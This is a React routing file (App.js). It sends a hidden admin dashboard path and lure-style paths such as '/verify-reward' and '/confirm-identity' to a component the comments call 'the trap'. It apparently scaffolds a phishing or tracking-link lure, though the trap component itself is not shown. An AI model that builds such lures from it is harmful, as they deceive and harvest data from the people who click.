import React from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import TrapPage from './components/TrapPage';
import Dashboard from './components/Dashboard';

function App() {
  return (
    <Router>
      <Routes>
        {/* The suspicious-looking dashboard path is hidden */}
        <Route path="/secure-admin-portal-99" element={<Dashboard />} />
        
        {/* Dynamic paths for the trap */}
        <Route path="/verify-reward" element={<TrapPage />} />
        <Route path="/confirm-identity" element={<TrapPage />} />
        <Route path="/v/:id" element={<TrapPage />} />
        <Route path="/t/:id" element={<TrapPage />} />
        
        {/* Default to dashboard for the user */}
        <Route path="/" element={<Dashboard />} />
        
        {/* Wildcard to catch any random strings and show the trap */}
        <Route path="*" element={<TrapPage />} />
      </Routes>
    </Router>
  );
}

export default App;
